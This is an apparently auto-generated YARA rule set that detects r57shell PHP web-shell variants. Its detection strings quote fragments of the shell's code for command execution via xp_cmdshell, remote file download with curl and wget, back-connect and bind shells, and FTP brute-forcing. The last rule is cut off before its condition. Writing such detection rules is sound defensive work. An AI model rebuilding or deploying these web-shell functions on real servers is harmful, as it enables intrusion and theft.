/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-03-02
   Identifier: php__r57
   Reference: php__r57 php_mixed auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule Backdoor_PHP_R57_a {
   meta:
      description = "php__r57 - file Backdoor.PHP.R57.a.b"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91c402e202f28a79730443cceb67a6bc1b093ca3cb2e5851cef52a79d1c716c3"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s3 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_show\")&&($_POST['cmd']!=\"db_query" ascii /* score: '24.00'*/
      $s4 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s5 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s6 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s7 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s8 = "     $sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii /* score: '23.00'*/
      $s9 = "<title>:: The r57 shell with modified by iFX :: listening L\\'Arc~en~Ciel - MilkyWay::</title>" fullword ascii /* score: '23.00'*/
      $s10 = "$head = '<!-- ??????????  ???? -->" fullword ascii /* score: '22.00'*/
      $s11 = " $_POST['cmd'] = which('fetch').\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s12 = "echo sr(45,\"<b>\".$lang[$language.'_text59'].$arrow.\"</b>\",in('text','dif_name',15,(!empty($_POST['dif_name'])?($_POST['dif_n" ascii /* score: '22.00'*/
      $s13 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s14 = " else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii /* score: '22.00'*/
      $s15 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s16 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '21.00'*/
      $s17 = "  $str = \"host='localhost' port='\".$_POST['db_port'].\"' user='\".$_POST['mysql_l'].\"' password='\".$_POST['mysql_p'].\"' dbn" ascii /* score: '21.00'*/
      $s18 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii /* score: '20.00'*/
      $s19 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii /* score: '20.00'*/
      $s20 = " $blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule Backdoor_PHP_R57_a_2 {
   meta:
      description = "php__r57 - file Backdoor.PHP.R57.a.c"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii /* score: '37.00'*/
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii /* score: '37.00'*/
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii /* score: '33.00'*/
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii /* score: '31.00'*/
      $s5 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii /* score: '28.00'*/
      $s6 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii /* score: '27.00'*/
      $s8 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii /* score: '27.00'*/
      $s9 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s10 = "'eng_text2' =>'Execute command on server'," fullword ascii /* score: '26.00'*/
      $s11 = "'eng_text1' =>'Executed command'," fullword ascii /* score: '26.00'*/
      $s12 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s13 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s14 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s15 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii /* score: '24.00'*/
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s17 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii /* score: '23.00'*/
      $s18 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s19 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii /* score: '22.00'*/
      $s20 = " $_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Backdoor_PHP_R57 {
   meta:
      description = "php__r57 - file Backdoor.PHP.R57.l"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "4bd10b983859a191da80b1fb49f8be389b1eb8ab0d1d90bd7e7b7f149445ebe7"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii /* score: '37.00'*/
      $x2 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii /* score: '37.00'*/
      $x3 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii /* score: '33.00'*/
      $x4 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii /* score: '31.00'*/
      $s5 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii /* score: '28.00'*/
      $s6 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii /* score: '27.00'*/
      $s8 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii /* score: '27.00'*/
      $s9 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s10 = "'eng_text2' =>'Execute command on server'," fullword ascii /* score: '26.00'*/
      $s11 = "'eng_text1' =>'Executed command'," fullword ascii /* score: '26.00'*/
      $s12 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s13 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s14 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s15 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii /* score: '24.00'*/
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s17 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }" fullword ascii /* score: '23.00'*/
      $s18 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s19 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii /* score: '22.00'*/
      $s20 = " $_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x0d20 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule Backdoor_PHP_R57_2 {
   meta:
      description = "php__r57 - file Backdoor.PHP.R57.a"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "2140e87f6e60a6132c97f6fcb9ca32aeec0d00f564146139efb0c36ba555eb2e"
   strings:
      $s1 = "<noscript><a href=http://click.hotlog.ru/?81606 target=_top><img" fullword ascii /* score: '28.00'*/
      $s2 = " $_POST['cmd']=\"cd /tmp/; gcc -o bd bd.c; ./bd \".$_POST['port'].\" \".$_POST['bind_pass'].\"; ps -aux | grep bd\";" fullword ascii /* score: '28.00'*/
      $s3 = "/* command execute */" fullword ascii /* score: '26.00'*/
      $s4 = "/* command execute form */" fullword ascii /* score: '26.00'*/
      $s5 = "document.write(\"<a href='http://click.hotlog.ru/?81606' target='_top'><img \"+" fullword ascii /* score: '25.00'*/
      $s6 = "echo \"<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RusH security team | <a href=http://rst.vo" ascii /* score: '23.00'*/
      $s7 = "fprintf(stderr,\\\"USAGE:%s <port num> <password>\\n\\\",progname);" fullword ascii /* score: '23.00'*/
      $s8 = "<!-- logo -->" fullword ascii /* score: '22.00'*/
      $s9 = "system(\\\"echo welcome to r57 shell && /bin/bash -i\\\");" fullword ascii /* score: '22.00'*/
      $s10 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=text name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii /* score: '21.00'*/
      $s11 = "if ((!$_POST['dir']) OR ($_POST['dir']==\"\")) { echo \"<input type=hidden name=dir size=85 value=\".exec(\"pwd\").\">\"; }" fullword ascii /* score: '21.00'*/
      $s12 = "           'eng_text1' => 'Executed command'," fullword ascii /* score: '21.00'*/
      $s13 = "           'eng_text2' => 'Execute command on server'," fullword ascii /* score: '21.00'*/
      $s14 = "/*  r57shell.php - " fullword ascii /* score: '20.00'*/
      $s15 = "echo \"<div align=center><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RusH security team | <a href=http://rst.vo" ascii /* score: '20.00'*/
      $s16 = "echo \"&nbsp;&nbsp;&nbsp; \".exec(\"uname -a\").\"<br>\";" fullword ascii /* score: '20.00'*/
      $s17 = "copy($HTTP_POST_FILES[\"userfile\"][tmp_name]," fullword ascii /* score: '18.00'*/
      $s18 = "/* alias execute */" fullword ascii /* score: '18.00'*/
      $s19 = "write(newfd,\\\"Password:\\\",10);" fullword ascii /* score: '18.00'*/
      $s20 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"ls -la\"; }" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _Backdoor_PHP_R57_a_Backdoor_PHP_R57_a_Backdoor_PHP_R57_0 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a.b, Backdoor.PHP.R57.a.c, Backdoor.PHP.R57.l"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91c402e202f28a79730443cceb67a6bc1b093ca3cb2e5851cef52a79d1c716c3"
      hash2 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
      hash3 = "4bd10b983859a191da80b1fb49f8be389b1eb8ab0d1d90bd7e7b7f149445ebe7"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '27.00'*/
      $s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '26.00'*/
      $s3 = "if ($_POST['cmd']==\"mysql_dump\")" fullword ascii /* score: '24.00'*/
      $s4 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii /* score: '24.00'*/
      $s5 = "     @mssql_query(\"insert into r57_temp_table EXEC master.dbo.xp_cmdshell '\".$_POST['test4_file'].\"'\",$db);" fullword ascii /* score: '24.00'*/
      $s6 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii /* score: '23.00'*/
      $s7 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s8 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner or UID\\r\\n- for CHGRP - group name or GID\\r\\n" ascii /* score: '21.00'*/
      $s9 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test4_md',15,(!empty($_POST['test4_md'])?($_POST['test4" ascii /* score: '20.00'*/
      $s10 = " $blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii /* score: '20.00'*/
      $s11 = "echo sr(15,\"<b>\".$lang[$language.'_text55'].$arrow.\"</b>\",in('checkbox','m id=m',0,'1').in('text','s_mask',82,'.txt;.php')." ascii /* score: '20.00'*/
      $s12 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii /* score: '20.00'*/
      $s13 = "($_POST['test4_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test4_port',15,(!empty" ascii /* score: '20.00'*/
      $s14 = " $blah = ex($p2.\" /tmp/bdpl \".$_POST['port'].\" &\");" fullword ascii /* score: '19.00'*/
      $s15 = " $blah = ex($p2.\" /tmp/back \".$_POST['ip'].\" \".$_POST['port'].\" &\");" fullword ascii /* score: '19.00'*/
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;/tmp )\");" fullword ascii /* score: '18.00'*/
      $s17 = " $_POST['cmd']=\"ps -aux | grep bdpl\";" fullword ascii /* score: '18.00'*/
      $s18 = " $_POST['cmd']=\"ps -aux | grep bd\";" fullword ascii /* score: '18.00'*/
      $s19 = " $_POST['cmd'] = which('lynx').\" -source \".$_POST['rem_file'].\" > \".$_POST['loc_file'].\"\";" fullword ascii /* score: '18.00'*/
      $s20 = " $_POST['cmd'] = which('wget').\" \".$_POST['rem_file'].\" -O \".$_POST['loc_file'].\"\";" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0d20 ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_R57_a_Backdoor_PHP_R57_1 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a.c, Backdoor.PHP.R57.l"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
      hash2 = "4bd10b983859a191da80b1fb49f8be389b1eb8ab0d1d90bd7e7b7f149445ebe7"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii /* score: '37.00'*/
      $x2 = "'eng_text85'=>'Test bypass safe_mode with commands execute via MSSQL server'," fullword ascii /* score: '33.00'*/
      $x3 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii /* score: '31.00'*/
      $s4 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii /* score: '28.00'*/
      $s5 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii /* score: '27.00'*/
      $s6 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii /* score: '27.00'*/
      $s7 = "'eng_text2' =>'Execute command on server'," fullword ascii /* score: '26.00'*/
      $s8 = "'eng_text1' =>'Executed command'," fullword ascii /* score: '26.00'*/
      $s9 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\")&&($_POST['cmd']!=\"db_query\")&&($_POST['cmd']!=\"ftp_bru" ascii /* score: '24.00'*/
      $s10 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii /* score: '22.00'*/
      $s11 = " $_POST['cmd'] = which('fetch').\" -o \".$_POST['loc_file'].\" -p \".$_POST['rem_file'].\"\";" fullword ascii /* score: '22.00'*/
      $s12 = " else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fo" ascii /* score: '22.00'*/
      $s13 = "echo sr(15,\"<b>\".$lang[$language.'_text88'].$arrow.\"</b>\",in('text','ftp_server_port',85,(!empty($_POST['ftp_server_port'])?" ascii /* score: '22.00'*/
      $s14 = "ox','dif id=dif',0,'1').in('text','dif_name',31,(!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"))));" fullword ascii /* score: '22.00'*/
      $s15 = "tp_password']):(\"billy@microsoft.com\"))));" fullword ascii /* score: '22.00'*/
      $s16 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii /* score: '21.00'*/
      $s17 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii /* score: '21.00'*/
      $s18 = "echo sr(35,\"<b>\".$lang[$language.'_text37'].' : '.$lang[$language.'_text38'].$arrow.\"</b>\",in('text','mysql_l',15,(!empty($_" ascii /* score: '20.00'*/
      $s19 = "echo '</table>'.$table_up3.\"</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by R" ascii /* score: '20.00'*/
      $s20 = "echo sr(25,\"<b>\".$lang[$language.'_text37'].$arrow.\"</b>\",in('text','ftp_login',45,(!empty($_POST['ftp_login'])?($_POST['ftp" ascii /* score: '20.00'*/
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0d20 ) and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_R57_a_Backdoor_PHP_R57_2 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a.b, Backdoor.PHP.R57.l"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91c402e202f28a79730443cceb67a6bc1b093ca3cb2e5851cef52a79d1c716c3"
      hash2 = "4bd10b983859a191da80b1fb49f8be389b1eb8ab0d1d90bd7e7b7f149445ebe7"
   strings:
      $s1 = "@print \"<img src=\\\"http://rst.void.ru/r57shell_version/version.php?img=1&version=\".$current_version.\"\\\" border=0 height=0" ascii /* score: '15.00'*/
      $s2 = "@print \"<img src=\\\"http://rst.void.ru/r57shell_version/version.php?img=1&version=\".$current_version.\"\\\" border=0 height=0" ascii /* score: '15.00'*/
      $s3 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii /* score: '12.00'*/
      $s4 = "'ru_text71'=>\"?????? ???????? ???????:\\r\\n- ??? CHOWN - ??? ?????? ???????????? ??? ??? UID (??????) \\r\\n- ??? ??????? CHGR" ascii /* score: '12.00'*/
      $s5 = "?? ?????? ??? GID (??????) \\r\\n- ??? ??????? CHMOD - ????? ????? ? ???????????? ????????????? (???????? 0777)\"," fullword ascii /* score: '12.00'*/
      $s6 = "/*  ?? ?????? ??????? ????? ?????? ?? ????? ?????: http://rst.void.ru" fullword ascii /* score: '11.00'*/
      $s7 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword ascii /* score: '11.00'*/
      $s8 = "'ru_text75'=>'* ????? ???????????? ?????????? ?????????'," fullword ascii /* score: '8.00'*/
      $s9 = "'ru_text47'=>'???????? ???????? php.ini'," fullword ascii /* score: '7.00'*/
      $s10 = "'ru_text65'=>'???????'," fullword ascii /* score: '4.00'*/
      $s11 = "$language='eng';" fullword ascii /* score: '4.00'*/
      $s12 = "'ru_text72'=>'????? ??? ??????'," fullword ascii /* score: '4.00'*/
      $s13 = "'ru_text4' =>'??????? ??????????'," fullword ascii /* score: '4.00'*/
      $s14 = "'ru_text60'=>'??????????'," fullword ascii /* score: '4.00'*/
      $s15 = "'ru_text20'=>'????????????'," fullword ascii /* score: '4.00'*/
      $s16 = "'ru_text6' =>'????????? ????'," fullword ascii /* score: '4.00'*/
      $s17 = "'ru_text50'=>'?????????? ? ??????????'," fullword ascii /* score: '4.00'*/
      $s18 = "'ru_text13'=>'IP-?????'," fullword ascii /* score: '4.00'*/
      $s19 = "'ru_butt8' =>'?????????'," fullword ascii /* score: '4.00'*/
      $s20 = "'ru_text46'=>'???????? phpinfo()'," fullword ascii /* score: '4.00'*/
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x0d20 ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_R57_a_Backdoor_PHP_R57_a_3 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a.b, Backdoor.PHP.R57.a.c"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91c402e202f28a79730443cceb67a6bc1b093ca3cb2e5851cef52a79d1c716c3"
      hash2 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
   strings:
      $s1 = " echo \"<div align=center><textarea cols=65 rows=10 name=db_query>\".(!empty($_POST['db_query'])?($_POST['db_query']):(\"SHOW DA" ascii /* score: '19.00'*/
      $s2 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii /* score: '18.00'*/
      $s3 = "$lin1 = ex('sysctl -n kernel.ostype');" fullword ascii /* score: '17.00'*/
      $s4 = "$lin2 = ex('sysctl -n kernel.osrelease');" fullword ascii /* score: '17.00'*/
      $s5 = "ASES;\\nSELECT * FROM user;\")).\"</textarea><br><input type=submit name=submit value=\\\" Run SQL query \\\"></div><br><br>\";" fullword ascii /* score: '14.00'*/
      $s6 = "if ($_POST['cmd']==\"db_query\")" fullword ascii /* score: '14.00'*/
      $s7 = "if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=" ascii /* score: '14.00'*/
      $s8 = "if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=" ascii /* score: '14.00'*/
      $s9 = " if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii /* score: '14.00'*/
      $s10 = "  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii /* score: '12.00'*/
      $s11 = "if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }" fullword ascii /* score: '12.00'*/
      $s12 = "<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b>" fullword ascii /* score: '12.00'*/
      $s13 = "$bsd1 = ex('sysctl -n kern.ostype');" fullword ascii /* score: '12.00'*/
      $s14 = "echo((!empty($id))?(ws(3).$id.\"<br>\"):(ws(3).\"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid().\"<br>" ascii /* score: '12.00'*/
      $s15 = "echo ws(3).@get_current_user().\"<br>\";" fullword ascii /* score: '12.00'*/
      $s16 = "  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii /* score: '12.00'*/
      $s17 = "$bsd2 = ex('sysctl -n kern.osrelease');" fullword ascii /* score: '12.00'*/
      $s18 = "     $sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii /* score: '11.00'*/
      $s19 = "     $sql = \"SELECT * FROM temp_r57_table;\";" fullword ascii /* score: '10.00'*/
      $s20 = " if(!$file=@fopen($_POST['e_name'],\"w\")) { echo we($_POST['e_name']); }" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Backdoor_PHP_R57_a_Backdoor_PHP_R57_Backdoor_PHP_R57_a_Backdoor_PHP_R57_4 {
   meta:
      description = "php__r57 - from files Backdoor.PHP.R57.a.b, Backdoor.PHP.R57.a, Backdoor.PHP.R57.a.c, Backdoor.PHP.R57.l"
      author = "Comps Team Malware Lab"
      reference = "php__r57 php_mixed auto gen"
      date = "2026-03-02"
      hash1 = "91c402e202f28a79730443cceb67a6bc1b093ca3cb2e5851cef52a79d1c716c3"
      hash2 = "2140e87f6e60a6132c97f6fcb9ca32aeec0d00f564146139efb0c36ba555eb2e"
      hash3 = "3ab6322a2a14de6698446bc5e8faf741bbdad288e95c844edc9e318b722d956f"
      hash4 = "4bd10b983859a191da80b1fb49f8be389b1eb8ab0d1d90bd7e7b7f149445ebe7"
   strings:
      $s1 = "echo \"<form name=upload method=POST ENCTYPE=multipart/form-data>\";" fullword ascii /* score: '11.00'*/
      $s2 = "foreach ($aliases as $alias_name=>$alias_cmd)" fullword ascii /* score: '7.00'*/
      $s3 = "echo \"</b></font>\";" fullword ascii /* score: '4.00'*/
      $s4 = "echo \"</font>\";" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000>" fullword ascii /* score: '4.00'*/
      $s6 = "BORDER-BOTTOM: #ffffff 1px solid;" fullword ascii /* score: '4.00'*/
      $s7 = "font: Fixedsys bold;" fullword ascii /* score: '4.00'*/
      $s8 = "BORDER-RIGHT:  #ffffff 1px solid;" fullword ascii /* score: '4.00'*/
      $s9 = "echo \"</b>\";" fullword ascii /* score: '4.00'*/
